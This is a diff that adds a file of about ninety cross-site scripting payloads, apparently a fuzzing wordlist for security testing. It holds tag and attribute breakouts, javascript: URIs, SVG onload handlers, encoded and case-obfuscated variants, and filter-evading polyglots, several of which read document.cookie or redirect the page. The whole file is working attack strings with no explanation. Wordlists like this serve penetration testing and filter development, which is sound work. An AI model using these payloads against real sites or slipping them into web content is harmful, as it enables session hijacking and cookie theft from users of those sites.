@@ -1,0 +1,91 @@
+\');confirm(1);//
+"; ||confirm('XSS') || "
+";a=prompt,a()//
+';a=prompt,a()//
+" autofocus onfocus=alert(1) "
+"autofocus/onfocus=alert(1)//
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
+%BCscript%BEalert(1822)%BC/script%BE
+%BCscript%BEalert(1891)%BC/script%BE
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+foo\’; alert(984);//’;
+foo\’; alert(document.cookie);//’;
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(874)</script>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1509)</script>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(595)</script>">
+foo<script>alert(1972)</script>
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<? foo="><script>alert(1)</script>">
+foo<script>alert(1)</script>
+foo<script>alert(847)</script>
+<? foo="><script>alert(870)</script>">
+<! foo="><script>alert(871)</script>">
+</ foo="><script>alert(872)</script>">
+<! foo="><script>alert(91)</script>">
+</ foo="><script>alert(91)</script>">
+<? foo="><script>alert(91)</script>">
+<? foo="><script>alert(964)</script>">
+<! foo="><script>alert(965)</script>">
+</ foo="><script>alert(966)</script>">
+foo<script>alert(981)</script>
+foo<script>alert(document.cookie)</script>
+<? foo="><script>javascript:alert(1505)</script>">
+<! foo="><script>javascript:alert(1506)</script>">
+</ foo="><script>javascript:alert(1507)</script>">
+<! foo="><script>javascript:alert(1)</script>">
+</ foo="><script>javascript:alert(1)</script>">
+<? foo="><script>javascript:alert(1)</script>">
+<? foo="><script>javascript:alert(591)</script>">
+<! foo="><script>javascript:alert(592)</script>">
+</ foo="><script>javascript:alert(593)</script>">
+<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
+<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
+<% foo><x foo="%><script>alert(123)</script>">
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<? foo="><x foo='?><script>alert(873)</script>'>">
+<% foo><x foo="%><script>alert(875)</script>">
+<? foo="><x foo='?><script>alert(91)</script>'>">
+<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
+<? foo="><x foo='?><script>javascript:alert(1508)</script>'>">
+<% foo><x foo="%><script>javascript:alert(1510)</script>">
+<% foo><x foo="%><script>javascript:alert(1)</script>">
+<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
+<? foo="><x foo='?><script>javascript:alert(594)</script>'>">
+<% foo><x foo="%><script>javascript:alert(596)</script>">
+<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
+<handler id="y">alert(127)</handler>
+<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
+javascript://%250Aalert(document.cookie)
+javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")
+javascript:alert(1)
+javascript:alert%281%29;
+javascript:alert(853)
+javascript:alert("hellox worldss")
+javascripT://https://google.com%0aalert(1);//https://google.com
+& JavaScript includes
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+" onclick=alert(1)//">click
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+"onclick=prompt(8)>"@x.y
+" onfocus=alert(1751) "> <"
+" onfocus=alert(document.domain) "> <"
+'*prompt(1)*'
+'?prompt`1`?'
+"-prompt(8)-"
+'-prompt(8)-'
+"><s"%2b"cript>alert(1971)</script>
+“><s”%2b”cript>alert(846)</script>
+“><s”%2b”cript>alert(978)</script>
+"><s"%2b"cript>alert(document.cookie)</script>
+“><s”%2b”cript>alert(document.cookie)</script>
+<s&#99;ript>alert(225)</script>
+\u0027-confirm`1`-\u0027 
+\u003c
+\u003C
+\u003csvg/onload=alert`1`\u003e
